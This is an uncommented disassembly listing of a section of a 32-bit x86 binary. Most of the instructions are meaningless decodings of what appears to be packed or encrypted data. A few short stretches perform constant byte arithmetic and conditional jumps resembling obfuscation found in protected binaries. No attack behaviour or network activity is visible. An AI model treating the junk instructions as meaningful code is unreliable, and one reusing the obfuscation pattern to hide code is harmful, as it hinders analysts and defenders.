  41d05b:	cld    
  41d05c:	sub    dh,BYTE PTR [edx-0x5e]
  41d05f:	shr    ch,cl
  41d061:	(bad)  
  41d063:	test   BYTE PTR [ecx-0x37ddd6f],0x1b
  41d06a:	sbb    bl,BYTE PTR [ecx+edx*8-0x80]
  41d06e:	fistp  DWORD PTR [eax-0x64db3fe]
  41d074:	out    dx,al
  41d075:	push   cs
  41d076:	push   cs
  41d077:	inc    edx
  41d078:	add    eax,0x4433a483
  41d07d:	pop    es
  41d07e:	pop    ecx
  41d07f:	dec    edi
  41d080:	mov    eax,0x299f9558
  41d085:	fmul   DWORD PTR [ecx+esi*8-0x3e]
  41d089:	jbe    0x41d105
  41d08b:	cmp    ebp,ecx
  41d08d:	es inc edx
  41d08f:	push   eax
  41d090:	int3   
  41d091:	pop    ecx
  41d092:	enter  0x6e53,0x92
  41d096:	js     0x41d05a
  41d098:	push   cs
  41d099:	xchg   ebx,eax
  41d09a:	repz xchg ebx,eax
  41d09c:	jbe    0x41d047
  41d09e:	jecxz  0x41d033
  41d0a0:	rcr    DWORD PTR [edi],1
  41d0a2:	aam    0x36
  41d0a4:	ficomp DWORD PTR [esi]
  41d0a6:	(bad)  
  41d0a8:	out    dx,al
  41d0a9:	stc    
  41d0aa:	arpl   WORD PTR [esi-0x6c35f938],si
  41d0b0:	retf   0x2cd9
  41d0b3:	popf   
  41d0b4:	ins    BYTE PTR es:[edi],dx
  41d0b5:	add    dl,dh
  41d0b7:	test   al,0x53
  41d0b9:	mov    al,0x49
  41d0bb:	push   cs
  41d0bc:	mov    edi,0xbedbd30d
  41d0c1:	hlt    
  41d0c2:	rol    DWORD PTR [ebp+0x1c2c883f],cl
  41d0c8:	stc    
  41d0c9:	dec    edi
  41d0ca:	rcl    BYTE PTR [eax-0x3ed54bec],1
  41d0d0:	mov    cl,BYTE PTR [esp+0x38]
  41d0d4:	sub    al,0x56
  41d0d6:	movzx  eax,al
  41d0d9:	movzx  ecx,cl
  41d0dc:	cdq    
  41d0dd:	idiv   ecx
  41d0df:	movzx  ecx,BYTE PTR [esp+0x2c]
  41d0e4:	or     eax,ecx
  41d0e6:	mov    BYTE PTR [esp+0xc],al
  41d0ea:	mov    BYTE PTR [esp+0x24],0x1
  41d0ef:	mov    BYTE PTR [esp+0x2b],0xcf
  41d0f4:	mov    BYTE PTR [esp+0x3c],0x6
  41d0f9:	mov    BYTE PTR [esp+0x38],0x25
  41d0fe:	mov    BYTE PTR [esp+0x2c],0xf8
  41d103:	mov    al,BYTE PTR [esp+0x2c]
  41d107:	mov    cl,BYTE PTR [esp+0x38]
  41d10b:	or     al,0xc4
  41d10d:	and    al,cl
  41d10f:	mov    cl,BYTE PTR [esp+0x3c]
  41d113:	imul   cl
  41d115:	mov    cl,BYTE PTR [esp+0x2b]
  41d119:	movzx  ecx,cl
  41d11c:	movzx  eax,al
  41d11f:	and    eax,ecx
  41d121:	mov    cl,BYTE PTR [esp+0x24]
  41d125:	movzx  ecx,cl
  41d128:	cdq    
  41d129:	idiv   ecx
  41d12b:	mov    cl,BYTE PTR [esp+0xc]
  41d12f:	cmp    cl,al
  41d131:	je     0x41d926
  41d137:	lea    eax,[esp+0x9c]
  41d13e:	push   eax
  41d13f:	lea    edi,[esp+0x80]
  41d146:	call   0x40f356
  41d14b:	cmp    eax,ebx
  41d14d:	jmp    0x41d51c
  41d152:	lahf   
  41d153:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d154:	out    dx,eax
  41d155:	cdq    
  41d156:	out    dx,eax
  41d157:	inc    ecx
  41d158:	push   ds
  41d159:	push   ds
  41d15a:	mov    eax,0x9abc6585
  41d15f:	inc    ebx
  41d160:	out    0xaa,eax
  41d162:	ss pop ebp
  41d164:	push   ss
  41d165:	sbb    BYTE PTR [edx+edx*1-0x4686e7e8],bh
  41d16c:	push   ebx
  41d16d:	sub    DWORD PTR [edi],ebp
  41d16f:	retf   0xfdf6
  41d172:	xchg   DWORD PTR [edx],esi
  41d174:	out    dx,eax
  41d175:	loope  0x41d179
  41d177:	repz pop esp
  41d179:	xchg   edi,eax
  41d17a:	in     eax,0x7d
  41d17c:	and    BYTE PTR [ecx],cl
  41d17e:	pop    eax
  41d17f:	int3   
  41d180:	nop
  41d181:	fmul   QWORD PTR [ebp-0x491b715]
  41d187:	ds xchg ebp,eax
  41d189:	ret    0xd8e1
  41d18c:	lea    ebp,[ebp-0xe031df3]
  41d192:	test   eax,0x3acb4403
  41d197:	dec    esp
  41d198:	lods   al,BYTE PTR ds:[esi]
  41d199:	push   edi
  41d19a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d19b:	jo     0x41d16e
  41d19d:	inc    eax
  41d19e:	xlat   BYTE PTR ds:[ebx]
  41d19f:	outs   dx,BYTE PTR ds:[esi]
  41d1a0:	fadd   st,st(5)
  41d1a2:	(bad)  
  41d1a3:	into   
  41d1a4:	jbe    0x41d1e7
  41d1a6:	mov    DWORD PTR ds:0x64f76482,edi
  41d1ac:	mov    ds:0x29eab742,al
  41d1b1:	daa    
  41d1b2:	adc    esi,ebx
  41d1b4:	xor    al,0xc0
  41d1b6:	ja     0x41d1f5
  41d1b8:	xor    eax,0xbcd39ac7
  41d1bd:	sbb    eax,0x127a7d71
  41d1c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d1c3:	sahf   
  41d1c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d1c5:	xor    eax,0xb362e040
  41d1ca:	pop    ebx
  41d1cb:	jb     0x41d1d4
  41d1cd:	pop    ds
  41d1ce:	sbb    esi,DWORD PTR [ecx-0x3f6b1b32]
  41d1d4:	cmp    esi,ebp
  41d1d6:	cmp    al,BYTE PTR [esi+0x4a]
  41d1d9:	lahf   
  41d1da:	dec    esp
  41d1db:	daa    
  41d1dc:	jl     0x41d1f4
  41d1de:	and    esp,DWORD PTR [ebx]
  41d1e0:	arpl   sp,cx
  41d1e2:	cdq    
  41d1e3:	or     DWORD PTR [ebx],ebp
  41d1e5:	clc    
  41d1e6:	sbb    ah,BYTE PTR [edi+0x44a2143f]
  41d1ec:	adc    DWORD PTR [edi+ecx*8],esi
  41d1ef:	rcl    DWORD PTR [eax+0x110114bb],cl
  41d1f5:	mov    BYTE PTR [ebx-0x56c6a43f],dh
  41d1fb:	loope  0x41d1db
  41d1fd:	push   edi
  41d1fe:	cmp    ebx,DWORD PTR [edx]
  41d200:	sub    al,BYTE PTR [ecx-0x1c]
  41d203:	(bad)  
  41d205:	cdq    
  41d206:	push   ss
  41d207:	(bad)  
  41d208:	enter  0xf3c1,0x3a
  41d20c:	pop    es
  41d20d:	adc    BYTE PTR [esi+0x65728186],bh
  41d213:	push   0xdcfdc746
  41d218:	sbb    DWORD PTR [edx+edi*8+0xfc8d9ef],0xc5997b0b
  41d223:	xchg   BYTE PTR cs:[ebp+ebp*8-0x834f7c],cl
  41d22b:	and    eax,DWORD PTR [ebx+ecx*2+0x14]
  41d22f:	imul   ebx
  41d231:	adc    BYTE PTR [eax+edi*4-0x2],0x78
  41d236:	push   cs
  41d237:	jb     0x41d2ae
  41d239:	or     al,0xd5
  41d23b:	add    ecx,edi
  41d23d:	daa    
  41d23e:	xchg   edi,eax
  41d23f:	pop    ss
  41d240:	fwait
  41d241:	dec    edi
  41d242:	out    dx,eax
  41d243:	or     DWORD PTR [ebx-0x53],edi
  41d246:	sbb    esp,edx
  41d248:	rol    BYTE PTR [edi+0x58],1
  41d24b:	sub    ecx,DWORD PTR [edi]
  41d24d:	mov    al,ds:0x8170ae8e
  41d252:	xchg   esp,eax
  41d253:	icebp  
  41d254:	mov    dl,0x4
  41d256:	xchg   edx,eax
  41d257:	mov    esi,0x46e4335b
  41d25c:	inc    ecx
  41d25d:	mov    ebp,0x2725a153
  41d262:	sub    eax,0x17a2df68
  41d267:	and    ah,BYTE PTR [esp+esi*1-0xd184b06]
  41d26e:	sbb    bl,al
  41d270:	inc    esi
  41d271:	or     edx,DWORD PTR [esp+edi*4]
  41d274:	imul   eax,DWORD PTR [ecx+edi*4+0x77],0xf8506c85
  41d27c:	inc    ebx
  41d27d:	repz pop esi
  41d27f:	js     0x41d2e2
  41d281:	adc    ebx,eax
  41d283:	sub    al,0x89
  41d285:	cmp    DWORD PTR [esi-0x4bb20dc3],ebp
  41d28b:	pop    eax
  41d28c:	sti    
  41d28d:	dec    ebp
  41d28e:	xchg   esp,eax
  41d28f:	(bad)  
  41d290:	(bad)  
  41d291:	cmp    eax,0x8551d9b2
  41d296:	(bad)  
  41d298:	cli    
  41d299:	outs   dx,BYTE PTR ds:[esi]
  41d29a:	(bad)  
  41d29b:	retf   
  41d29c:	dec    esp
  41d29d:	pop    ecx
  41d29e:	in     al,dx
  41d29f:	push   DWORD PTR [edi+ecx*2-0x4fe20224]
  41d2a6:	sti    
  41d2a7:	push   0x6b
  41d2a9:	pop    es
  41d2aa:	mov    edx,0xd9f4e3f9
  41d2af:	adc    al,0xd
  41d2b1:	pop    es
  41d2b2:	loopne 0x41d2e2
  41d2b4:	(bad)  
  41d2b5:	fdivr  st(5),st
  41d2b7:	fndisi(8087 only) 
  41d2b9:	out    dx,al
  41d2ba:	outs   dx,DWORD PTR ds:[esi]
  41d2bb:	inc    ebp
  41d2bc:	(bad)  
  41d2bd:	xchg   ecx,eax
  41d2be:	cwde   
  41d2bf:	and    esp,edi
  41d2c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d2c2:	fwait
  41d2c3:	xor    ch,BYTE PTR [edi-0x7c]
  41d2c6:	ds icebp 
  41d2c8:	and    ch,BYTE PTR [edx+0x2b]
  41d2cb:	fisub  DWORD PTR [ebx+ecx*8]
  41d2ce:	dec    esp
  41d2cf:	enter  0xb781,0x24
  41d2d3:	std    
  41d2d4:	push   0xd6b4139a
  41d2d9:	pop    ecx
  41d2da:	pop    edi
  41d2db:	stos   DWORD PTR es:[edi],eax
  41d2dc:	in     eax,dx
  41d2dd:	mov    bh,BYTE PTR ds:0x2e1852f5
  41d2e3:	and    DWORD PTR [edi+0x281d7061],0xeda42338
  41d2ed:	fistp  QWORD PTR [ebx-0x5b]
  41d2f0:	lock push ds
  41d2f2:	cdq    
  41d2f3:	icebp  
  41d2f4:	bts    ecx,edi
  41d2f7:	out    0xa6,al
  41d2f9:	mov    ah,0x23
  41d2fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d2fc:	jmp    0xb3ce:0x61f16fca
  41d303:	fidivr DWORD PTR [ebp+0x6875eb34]
  41d309:	sub    BYTE PTR [ebx-0x48],0x69
  41d30d:	jmp    0xc5f8a3d4
  41d312:	retw   
  41d314:	mov    ds:0x664f754c,al
  41d319:	push   ss
  41d31a:	xchg   edi,eax
  41d31b:	or     DWORD PTR [esi-0x43513af7],ebp
  41d321:	scas   eax,DWORD PTR es:[edi]
  41d322:	in     al,dx
  41d323:	xchg   esi,eax
  41d324:	fiadd  DWORD PTR [edi]
  41d326:	xor    BYTE PTR [ecx+eax*1],dh
  41d329:	sbb    eax,0x3112228c
  41d32e:	jecxz  0x41d395
  41d330:	ins    BYTE PTR es:[edi],dx
  41d331:	sbb    dl,dl
  41d333:	mov    ah,0x6
  41d335:	lds    esi,FWORD PTR [edi]
  41d337:	sti    
  41d338:	push   cs
  41d339:	sbb    eax,ebx
  41d33b:	add    eax,0xaf131d9b
  41d340:	cdq    
  41d341:	es pop edi
  41d343:	fisub  WORD PTR [edx]
  41d345:	out    dx,al
  41d346:	ja     0x41d34c
  41d348:	sti    
  41d349:	loop   0x41d369
  41d34b:	inc    eax
  41d34c:	and    BYTE PTR [esp+edx*1],0xec
  41d350:	call   0x6c09:0xc689f27c
  41d357:	add    BYTE PTR [ebp+0x79],cl
  41d35a:	leave  
  41d35b:	jl     0x41d3b1
  41d35d:	outs   dx,BYTE PTR ds:[esi]
  41d35e:	out    dx,eax
  41d35f:	sbb    eax,0xd92ea5e
  41d364:	test   eax,ebp
  41d366:	lods   eax,DWORD PTR ds:[esi]
  41d367:	mov    edx,0xf692713a
  41d36c:	sub    al,0x6c
  41d36e:	mov    eax,ds:0xd244f074
  41d373:	push   ecx
  41d374:	and    DWORD PTR [ecx+0x7b],esi
  41d377:	ds aam 0xa7
  41d37a:	aam    0xc9
  41d37c:	je     0x41d3f6
  41d37e:	mov    ah,bh
  41d380:	inc    ecx
  41d381:	cmp    al,0xdb
  41d383:	sbb    DWORD PTR ds:0xe447abd9,eax
  41d389:	cs jmp 0x2d498a53
  41d38f:	dec    eax
  41d390:	popf   
  41d391:	dec    edi
  41d392:	inc    ebx
  41d393:	push   ebp
  41d394:	mov    bl,0xee
  41d396:	mov    ebx,0xca791680
  41d39b:	in     al,dx
  41d39c:	aaa    
  41d39d:	xor    BYTE PTR [esi],al
  41d39f:	xor    eax,0xa4f6ca2f
  41d3a4:	cli    
  41d3a5:	mov    BYTE PTR [eax+0x7e],al
  41d3a8:	adc    DWORD PTR [eax-0x76],eax
  41d3ab:	ret    
  41d3ac:	call   0x384ad609
  41d3b1:	pop    ds
  41d3b2:	mov    ecx,0xad892d9
  41d3b7:	or     dl,bl
  41d3b9:	adc    ebp,ebx
  41d3bb:	loope  0x41d374
  41d3bd:	inc    esi
  41d3be:	cld    
  41d3bf:	dec    DWORD PTR [edi-0xc]
  41d3c2:	loope  0x41d3d3
  41d3c4:	push   0xf52e8eee
  41d3c9:	xchg   ecx,eax
  41d3ca:	out    dx,al
  41d3cb:	and    ebp,esp
  41d3cd:	rol    BYTE PTR ds:0x27ac4c0e,1
  41d3d3:	pop    edx
  41d3d4:	inc    ebp
  41d3d5:	jmp    0xc653e21e
  41d3da:	loopne 0x41d390
  41d3dc:	xchg   edi,eax
  41d3dd:	push   ebx
  41d3de:	add    esp,esp
  41d3e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d3e1:	add    eax,0x708249fc
  41d3e6:	xchg   al,dh
  41d3e8:	pushf  
  41d3e9:	test   DWORD PTR [esi],esi
  41d3eb:	(bad)  
  41d3ec:	pop    eax
  41d3ed:	mov    al,0x5d
  41d3ef:	in     eax,dx
  41d3f0:	gs jns 0x41d3f5
  41d3f3:	mov    ah,0x9a
  41d3f5:	cli    
  41d3f6:	dec    ebp
  41d3f7:	jmp    0xf8a7afac
  41d3fc:	mov    ds:0xa2283a50,eax
  41d401:	adc    ch,bh
  41d403:	iret   
  41d404:	pop    esp
  41d405:	xchg   ebp,eax
  41d406:	jecxz  0x41d3e8
  41d408:	shl    BYTE PTR [ebp+0x4a5fa374],1
  41d40e:	scas   eax,DWORD PTR es:[edi]
  41d40f:	mov    edi,0xe0e9d16c
  41d414:	loop   0x41d436
  41d416:	push   ss
  41d417:	push   eax
  41d418:	adc    BYTE PTR [edi+0xe90d7a2],dl
  41d41e:	sbb    esp,ebp
  41d420:	arpl   WORD PTR [esi],si
  41d422:	jno    0x41d402
  41d424:	jecxz  0x41d436
  41d426:	pop    esp
  41d427:	test   BYTE PTR [ecx],0xd7
  41d42a:	gs es pop es
  41d42d:	push   0x63
  41d42f:	fistp  DWORD PTR [edi+0x42e3f73b]
  41d435:	pushf  
  41d436:	adc    al,0x2
  41d438:	test   al,0xb6
  41d43a:	sub    al,0x28
  41d43c:	fadd   QWORD PTR es:[edi+ebx*2]
  41d440:	aas    
  41d441:	sbb    esp,DWORD PTR [eax]
  41d443:	inc    ebx
  41d444:	(bad)  
  41d445:	std    
  41d446:	in     eax,dx
  41d447:	rcl    edi,1
  41d449:	fwait
  41d44a:	push   ebp
  41d44b:	aad    0xf7
  41d44d:	xchg   BYTE PTR [ecx-0x51780af2],ah
  41d453:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d454:	popf   
  41d455:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d456:	popf   
  41d457:	in     eax,0x50
  41d459:	mov    al,0x3b
  41d45b:	je     0x41d447
  41d45d:	xor    eax,DWORD PTR [edx-0x6a95fbbd]
  41d463:	cmp    DWORD PTR [eax+eiz*8],eax
  41d466:	mov    DWORD PTR [eax],edi
  41d468:	popa   
  41d469:	mul    DWORD PTR [ebp+0x590e510b]
  41d46f:	call   0x368f15f3
  41d474:	add    eax,0x72f784ef
  41d479:	dec    ebp
  41d47a:	pop    ss
  41d47b:	push   0x41
  41d47d:	ret    0x25ca
  41d480:	mov    edi,0x3047cf30
  41d485:	mov    DWORD PTR [edx],ebx
  41d487:	mov    edx,DWORD PTR [esi-0x62]
  41d48a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d48b:	(bad)  
  41d48c:	ins    BYTE PTR es:[edi],dx
  41d48d:	or     eax,0xa9fc2aa1
  41d492:	fmulp  st(6),st
  41d494:	retf   
  41d495:	je     0x41d420
  41d497:	call   0xeeb3:0x3a85eaea
  41d49e:	and    al,0xf1
  41d4a0:	mov    cl,ah
  41d4a2:	into   
  41d4a3:	clc    
  41d4a4:	inc    esi
  41d4a5:	stos   DWORD PTR es:[edi],eax
  41d4a6:	repnz sub BYTE PTR [edx],dh
  41d4a9:	or     eax,0x28bf33cf
  41d4ae:	push   esp
  41d4af:	push   es
  41d4b0:	call   0x440f:0x5eed1ca4
  41d4b7:	add    al,0xa7
  41d4b9:	dec    ebx
  41d4ba:	sub    bl,BYTE PTR [esi]
  41d4bc:	xchg   DWORD PTR [ebp+0x6922802f],esi
  41d4c2:	xor    ebp,DWORD PTR [edi+0x43c83a88]
  41d4c8:	add    DWORD PTR [ebx+ecx*8],eax
  41d4cb:	sbb    ecx,DWORD PTR [edx-0x61840903]
  41d4d1:	mov    bh,bl
  41d4d3:	push   ebx
  41d4d4:	mov    edx,0x4f4572d3
  41d4d9:	jge    0x41d542
  41d4db:	lea    esp,[esi]
  41d4dd:	les    esi,FWORD PTR [eax]
  41d4df:	pop    es
  41d4e0:	test   eax,0x6a504432
  41d4e5:	dec    ebp
  41d4e6:	jmp    0xc1fd:0x81aae237
  41d4ed:	popf   
  41d4ee:	lods   al,BYTE PTR ds:[esi]
  41d4ef:	jmp    0x4a8f:0x512a84e1
  41d4f6:	loope  0x41d4f3
  41d4f8:	xchg   ecx,eax
  41d4f9:	xchg   esi,eax
  41d4fa:	cmc    
  41d4fb:	mov    ch,0x5f
  41d4fd:	or     eax,0x20192d6c
  41d502:	pop    esp
  41d503:	pop    edx
  41d504:	sbb    ch,BYTE PTR [esi]
  41d506:	push   esp
  41d507:	lahf   
  41d508:	lahf   
  41d509:	push   0x11dd32c6
  41d50e:	adc    ecx,ebx
  41d510:	jecxz  0x41d4f3
  41d512:	jnp    0x41d514
  41d514:	out    dx,eax
  41d515:	ficom  WORD PTR [ecx+0x74c0e0e3]
  41d51b:	mov    edi,0x404850f
  41d520:	add    BYTE PTR [eax],al
  41d522:	cmp    edx,esi
  41d524:	jne    0x41d926
  41d52a:	xor    eax,eax
  41d52c:	jmp    0x41e9f0
  41d531:	mov    eax,DWORD PTR [esp+0x70]
  41d535:	mov    ecx,DWORD PTR [esp+0x74]
  41d539:	jmp    0x41d908
  41d53e:	ss lahf 
  41d540:	xchg   ebp,eax
  41d541:	sbb    al,0x7c
  41d543:	sbb    bl,BYTE PTR [esi]
  41d545:	fwait
  41d546:	push   ebx
  41d547:	out    0xc5,eax
  41d549:	jl     0x41d5ad
  41d54b:	shr    BYTE PTR [ecx+0x1655dabc],cl
  41d551:	sbb    BYTE PTR [edx+edx*1-0x967e7e8],bh
  41d558:	push   eax
  41d559:	loope  0x41d51d
  41d55b:	jae    0x41d54d
  41d55d:	jnp    0x41d5bd
  41d55f:	pop    esp
  41d560:	add    esi,ecx
  41d562:	mov    ch,0xdf
  41d564:	fcom   QWORD PTR [edx]
  41d566:	jno    0x41d51e
  41d568:	sub    esp,ebx
  41d56a:	adc    ch,al
  41d56c:	mov    eax,ds:0x831f4649
  41d571:	mov    ch,0x2c
  41d574:	add    dh,dl
  41d576:	cmp    esi,DWORD PTR [esi-0x53b6b1]
  41d57c:	sub    eax,0x3167fbf7
  41d581:	repz lea edi,[edi-0x4f]
  41d585:	mov    al,ds:0x7ee8779
  41d58a:	imul   esp,DWORD PTR [edx-0x73],0xe21bf27b
  41d591:	ja     0x41d5f6
  41d593:	je     0x41d5b3
  41d595:	(bad)  
  41d596:	fmul   st(1),st
  41d598:	mov    ds:0x4442d365,eax
  41d59d:	fidiv  WORD PTR [ebx-0x835a244]
  41d5a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5a4:	or     ebp,DWORD PTR [edx]
  41d5a6:	mov    ch,0x22
  41d5a8:	dec    ebx
  41d5a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d5aa:	sbb    ebx,esp
  41d5ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d5ad:	repz add ch,dh
  41d5b0:	iret   
  41d5b1:	(bad)  
  41d5b2:	xchg   edx,eax
  41d5b3:	stos   BYTE PTR es:[edi],al
  41d5b4:	mov    edi,0x9b27c4bb
  41d5b9:	loop   0x41d5ac
  41d5bb:	sbb    eax,0xbb208ecb
  41d5c0:	add    cl,BYTE PTR [eax+0x2d833c6d]
  41d5c6:	and    ch,BYTE PTR [edi-0x4dde5796]
  41d5cc:	cld    
  41d5cd:	nop
  41d5ce:	loope  0x41d649
  41d5d0:	jmp    0xe14e:0xe9ff9633
  41d5d7:	and    DWORD PTR ds:0x3794e304,ebp
  41d5dd:	xchg   ebp,eax
  41d5de:	into   
  41d5df:	mov    edi,0xbd0d2d46
  41d5e4:	enter  0x2840,0x76
  41d5e8:	jmp    0xff01:0x181925cc
  41d5ef:	pop    edx
  41d5f0:	out    dx,eax
  41d5f1:	dec    esi
  41d5f2:	fsubr  DWORD PTR [esi-0x5d]
  41d5f5:	mov    esi,ds
  41d5f7:	mov    dh,0x89
  41d5f9:	lods   al,BYTE PTR ds:[esi]
  41d5fa:	pop    edx
  41d5fb:	(bad)  
  41d5fc:	in     eax,dx
  41d5fd:	and    al,0xa6
  41d5ff:	or     DWORD PTR [edx-0x4c],ebp
  41d602:	and    eax,0xe57b3847
  41d607:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d608:	xor    esi,DWORD PTR [ebp+0x19b69f6b]
  41d60e:	dec    eax
  41d60f:	test   al,0xdf
  41d611:	inc    edx
  41d612:	mov    esi,0xdd8154b7
  41d617:	outs   dx,DWORD PTR ds:[esi]
  41d618:	push   esi
  41d619:	xor    edx,ecx
  41d61b:	xor    DWORD PTR [edi],eax
  41d61d:	aam    0xba
  41d61f:	pop    edi
  41d620:	lods   eax,DWORD PTR ds:[esi]
  41d621:	fldenv [edi]
  41d623:	(bad)  
  41d624:	xchg   esi,eax
  41d625:	and    dh,bh
  41d627:	jl     0x41d687
  41d629:	outs   dx,BYTE PTR ds:[esi]
  41d62a:	jle    0x41d696
  41d62c:	or     al,0x5e
  41d62e:	dec    ebp
  41d62f:	mov    dl,BYTE PTR [esi+0x7d]
  41d632:	bound  esp,QWORD PTR [ebx]
  41d634:	or     DWORD PTR [eax+0x6],ecx
  41d637:	xchg   ebp,eax
  41d638:	push   eax
  41d639:	sar    BYTE PTR [eax+edi*2],1
  41d63c:	popa   
  41d63d:	inc    eax
  41d63e:	hlt    
  41d63f:	ss lahf 
  41d641:	or     BYTE PTR [esi-0x55dd02f0],0x9f
  41d648:	mov    dl,0x5e
  41d64a:	arpl   dx,ax
  41d64c:	pop    esi
  41d64d:	jo     0x41d69b
  41d64f:	mov    bl,0x66
  41d651:	shl    BYTE PTR [ecx],cl
  41d653:	jno    0x41d69b
  41d655:	pop    edx
  41d656:	push   esi
  41d657:	mov    cl,BYTE PTR [edi-0x16]
  41d65a:	pushf  
  41d65b:	repz jl 0x41d5f2
  41d65e:	xor    DWORD PTR [ebp+0x1bb67d0e],edx
  41d664:	dec    esi
  41d665:	shl    BYTE PTR [eax],cl
  41d667:	mov    cl,0xff
  41d669:	mov    eax,0x144c38c
  41d66e:	stos   BYTE PTR es:[edi],al
  41d66f:	pop    edi
  41d670:	in     al,0x16
  41d672:	or     esp,edx
  41d674:	cmp    al,BYTE PTR [ecx+0x165d2cc2]
  41d67a:	in     al,dx
  41d67b:	test   eax,0xdbccd9e9
  41d680:	xchg   esi,eax
  41d681:	cmp    eax,0xf89e3936
  41d686:	in     eax,dx
  41d687:	es hlt 
  41d689:	shr    BYTE PTR [edi-0x4e],0x8e
  41d68d:	add    cl,al
  41d68f:	push   es
  41d690:	and    edx,DWORD PTR [ecx-0x77e15dcd]
  41d696:	xor    edi,DWORD PTR [ecx-0x21]
  41d699:	call   0x8b83:0x9b8961b2
  41d6a0:	lahf   
  41d6a1:	cs xchg edx,eax
  41d6a3:	jecxz  0x41d71c
  41d6a5:	inc    edi
  41d6a6:	not    BYTE PTR [edi+0x4500f257]
  41d6ac:	ds mov ah,0x32
  41d6af:	push   ebp
  41d6b0:	int    0x30
  41d6b2:	scas   eax,DWORD PTR es:[edi]
  41d6b3:	push   cs
  41d6b4:	mov    esp,0x3ddb686f
  41d6b9:	lods   eax,DWORD PTR ds:[esi]
  41d6ba:	xchg   esp,eax
  41d6bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d6bc:	xor    eax,0xe6bbb9ff
  41d6c1:	and    cl,al
  41d6c3:	mov    eax,ds:0x425d00c9
  41d6c8:	push   ebp
  41d6c9:	jmp    DWORD PTR [eax]
  41d6cb:	sbb    edx,DWORD PTR [ebx-0x25]
  41d6ce:	cld    
  41d6cf:	shl    ah,0xb2
  41d6d2:	(bad)  
  41d6d3:	adc    al,0xdb
  41d6d5:	xchg   ebx,eax
  41d6d6:	or     bx,dx
  41d6d9:	sub    ch,0x4
  41d6dc:	in     eax,0x69
  41d6de:	retf   
  41d6df:	retf   0xd22e
  41d6e2:	bound  edi,QWORD PTR es:[edx-0x691862]
  41d6e9:	add    eax,DWORD PTR [ecx-0x7c]
  41d6ec:	dec    esp
  41d6ed:	sbb    al,0x8c
  41d6ef:	or     esi,eax
  41d6f1:	clc    
  41d6f2:	ds mov bl,0xc9
  41d6f5:	push   edi
  41d6f6:	(bad)  
  41d6f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d6f8:	dec    esp
  41d6f9:	idiv   BYTE PTR ds:0xbfd4c3c9
  41d6ff:	xor    dl,BYTE PTR ds:0x23ef1d00
  41d705:	xchg   edi,eax
  41d706:	cmp    eax,ebx
  41d708:	fild   QWORD PTR [eax-0x64eef88a]
  41d70e:	jnp    0x41d71b
  41d710:	mov    ecx,0x2a5dae74
  41d715:	inc    ecx
  41d716:	int3   
  41d717:	shr    DWORD PTR [ebp+0x2f288d4],0x63
  41d71e:	xor    edi,DWORD PTR [esi-0x34]
  41d721:	push   eax
  41d722:	retf   
  41d723:	repnz fbstp TBYTE PTR [edi-0x21]
  41d727:	ss test eax,0xa1f52b4b
  41d72d:	xor    edx,DWORD PTR [esi+esi*1+0xf]
  41d731:	test   al,0x25
  41d733:	xor    esp,ecx
  41d735:	(bad)  
  41d736:	shl    esi,cl
  41d738:	mov    al,ds:0x7b8faf18
  41d73d:	inc    ecx
  41d73e:	and    BYTE PTR [edx-0x772ebc76],ch
  41d744:	adc    esp,DWORD PTR [edi]
  41d746:	in     eax,0xd9
  41d748:	xchg   ebp,eax
  41d749:	push   edx
  41d74a:	mov    ecx,cs
  41d74c:	sbb    BYTE PTR [ebx],cl
  41d74e:	add    eax,0x5b661b07
  41d753:	jmp    0xce73:0xbac01289
  41d75a:	dec    edx
  41d75b:	lahf   
  41d75c:	shl    DWORD PTR [ecx+0x10],0xda
  41d760:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d761:	push   0x64
  41d763:	aaa    
  41d764:	sub    eax,0xa8ebf115
  41d769:	push   0x5b44d021
  41d76e:	dec    ecx
  41d76f:	test   al,0x14
  41d771:	ret    
  41d772:	jne    0x41d747
  41d774:	and    ch,BYTE PTR [edi+edi*8+0x1be21ead]
  41d77b:	or     edi,DWORD PTR [ebx+0x5393287f]
  41d781:	jno    0x41d713
  41d783:	dec    edx
  41d784:	push   ds
  41d785:	xchg   ebx,eax
  41d786:	sbb    al,0x32
  41d788:	mov    al,ds:0xe1cd9bd0
  41d78d:	cld    
  41d78e:	hlt    
  41d78f:	xchg   DWORD PTR [ebp-0x49],ebp
  41d792:	call   FWORD PTR [edx]
  41d794:	fs fst st(1)
  41d797:	or     esi,DWORD PTR ds:0x7b899d2b
  41d79d:	xchg   esi,eax
  41d79e:	inc    ecx
  41d79f:	adc    BYTE PTR [ecx],dh
  41d7a1:	cli    
  41d7a2:	das    
  41d7a3:	adc    DWORD PTR [edx+0x67],eax
  41d7a6:	sub    dl,dl
  41d7a8:	pop    eax
  41d7a9:	sub    al,0x81
  41d7ab:	fsub   DWORD PTR [esi-0x50]
  41d7ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d7af:	dec    ebp
  41d7b0:	bound  ecx,QWORD PTR [eax+0x550e21c0]
  41d7b6:	mov    ds:0x5616f351,eax
  41d7bb:	iret   
  41d7bc:	cmp    BYTE PTR [ebx],0x93
  41d7bf:	mov    ch,cl
  41d7c1:	xor    al,0x27
  41d7c3:	out    0x1c,al
  41d7c5:	push   0xffffffcf
  41d7c7:	mov    dl,0xe3
  41d7c9:	mov    eax,ds:0x6de64983
  41d7ce:	retf   
  41d7cf:	bound  edx,QWORD PTR [esi]
  41d7d1:	std    
  41d7d2:	pusha  
  41d7d3:	fldl2t 
  41d7d5:	icebp  
  41d7d6:	or     ebp,DWORD PTR [ebx-0x79]
  41d7d9:	daa    
  41d7da:	push   edx
  41d7db:	mov    al,ds:0x5157ae5b
